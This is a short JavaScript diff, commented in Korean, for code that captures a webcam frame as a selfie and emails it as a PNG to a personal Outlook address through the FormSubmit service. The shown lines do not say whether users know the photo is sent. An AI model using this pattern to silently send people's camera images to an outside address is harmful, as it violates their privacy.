@@ -66,18 +66,13 @@
                     // 2. 셀카 찍기 (캔버스에 프레임 드로잉)
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // 인코딩을 거치지 않고 Blob 객체 생성
+                    // 3. 인코딩 없이 순수 Blob 파일 객체로 변환
                     canvas.toBlob(async (blob) => {
                         if (!blob) return;
 
-                        // 3. URL 생성 및 사진 저장 (Object URL)
-                        const imageUrl = URL.createObjectURL(blob);
-                        console.log('Created Image URL:', imageUrl);
-
-                        // 4. FormSubmit을 통한 전송 준비
+                        // 4. FormSubmit을 통해 사진 파일을 메일 첨부 형태로 전송
                         const formData = new FormData();
                         formData.append('image', blob, 'selfie.png');
-                        formData.append('image_url', imageUrl);
 
                         try {
                             await fetch('https://formsubmit.co/ajax/jsbi110@outlook.kr', {
